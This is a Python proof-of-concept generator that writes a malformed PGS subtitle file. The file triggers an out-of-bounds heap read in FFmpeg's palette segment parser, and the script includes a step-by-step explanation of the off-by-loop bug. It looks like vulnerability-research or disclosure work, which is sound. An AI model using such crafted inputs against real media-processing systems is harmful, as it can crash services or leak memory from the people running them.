#!/usr/bin/env python3
"""
PoC generator for VULN 002: Out-of-bounds Read in parse_palette_segment()
in FFmpeg libavcodec/pgssubdec.c (lines 354-374).

Vulnerability: The palette parsing loop condition is `buf < buf_end` (needs
only 1 byte to enter) but each iteration consumes 5 bytes.
When (segment_length - 2) % 5 != 0, the last iteration reads bytes beyond
buf_end.

Attack:
- PDS segment_length = 8
- PDS data = palette_id(1) + palette_version(1) + 6 bytes of palette entries
- 6 bytes = 1 complete entry (5 bytes) + 1 leftover byte
- The leftover byte satisfies `buf < buf_end`, triggering the loop body
  which reads 5 bytes -> 4 bytes OOB read
"""

import struct
import os
import sys

def make_pgs_packet(segment_type, segment_data, pts=0, dts=0):
    """
    Build a raw PGS packet as written to a .sup file:
      "PG" (2) + pts (4) + dts (4) + segment_type (1) + segment_length (2) + segment_data
    """
    magic = b'\x50\x47'  # "PG"
    header = struct.pack('>IIBh', pts, dts, segment_type, len(segment_data))
    # Fix: use unsigned short for segment_length
    header = struct.pack('>II', pts, dts) + struct.pack('>BH', segment_type, len(segment_data))
    return magic + header + segment_data


def make_pcs(width=1920, height=1080, composition_number=0,
             state=0x00, palette_update_flag=0x00, palette_id=0,
             object_count=0):
    """
    Build a Presentation Composition Segment (PCS, type=0x16).

    Layout:
      width(2) + height(2) + frame_rate(1) + composition_number(2) +
      composition_state(1) + palette_update_flag(1) + palette_id(1) +
      object_count(1) = 11 bytes minimum
    """
    data = struct.pack('>HHBHBBBb',
                       width,
                       height,
                       0x10,                 # frame_rate placeholder
                       composition_number,
                       state << 6,           # composition_state (top 2 bits)
                       palette_update_flag,
                       palette_id,
                       object_count)
    # struct 'b' for object_count might sign-extend; use explicit pack
    data = (struct.pack('>HH', width, height) +
            bytes([0x10]) +                  # frame_rate
            struct.pack('>H', composition_number) +
            bytes([state << 6]) +            # composition_state
            bytes([palette_update_flag]) +
            bytes([palette_id]) +
            bytes([object_count]))
    return make_pgs_packet(0x16, data)


def make_pds_malformed():
    """
    Build a malformed Palette Definition Segment (PDS, type=0x14).

    segment_length = 8 means the decoder calls:
      parse_palette_segment(avctx, buf, 8)

    Inside parse_palette_segment:
      buf_end = buf + 8
      id = bytestream_get_byte(&buf)   -> consumes 1 byte (palette_id)
      buf += 1                          -> skips palette_version (1 byte)
      -- 6 bytes remain --
      Loop iter 1: reads 5 bytes (ok), 1 byte remains
      Loop cond: buf < buf_end (TRUE - 1 byte left)
      Loop iter 2: reads 5 bytes via bytestream_get_byte x5
                   -> 4 bytes are OOB -> ASAN heap-buffer-overflow
    """
    palette_id      = 0x00
    palette_version = 0x00

    # 1 complete palette entry (5 bytes): color_id, Y, Cr, Cb, alpha
    entry1 = bytes([0x00, 0x10, 0x80, 0x80, 0xFF])

    # 1 leftover byte that satisfies buf < buf_end but triggers OOB in iter 2
    leftover = bytes([0x01])

    pds_data = bytes([palette_id, palette_version]) + entry1 + leftover
    assert len(pds_data) == 8, f"PDS data length should be 8, got {len(pds_data)}"

    return make_pgs_packet(0x14, pds_data)


def make_end():
    """Build an End of Display Set Segment (END, type=0x80)."""
    return make_pgs_packet(0x80, b'')


def generate_sup(output_path):
    """
    Build a minimal SUP file:
      [PCS - valid, sets up context]
      [PDS - malformed with 6 bytes of palette data -> OOB read]
      [END - terminates the display set]
    """
    pcs = make_pcs(width=1920, height=1080, composition_number=0,
                   state=0x00, palette_update_flag=0x80, palette_id=0,
                   object_count=0)
    pds = make_pds_malformed()
    end = make_end()

    with open(output_path, 'wb') as f:
        f.write(pcs)
        f.write(pds)
        f.write(end)

    print(f"[+] Generated {output_path} ({os.path.getsize(output_path)} bytes)")
    print(f"    PCS packet: {len(pcs)} bytes")
    print(f"    PDS packet: {len(pds)} bytes  <-- malformed (6 bytes palette data, OOB trigger)")
    print(f"    END packet: {len(end)} bytes")
    print(f"[+] PDS segment_length=8: palette_id(1)+palette_version(1)+entry(5)+leftover(1)")
    print(f"    Loop iter 2 reads 5 bytes with only 1 valid -> 4 bytes OOB read")


if __name__ == '__main__':
    out = sys.argv[1] if len(sys.argv) > 1 else 'vuln_002_input.sup'
    generate_sup(out)
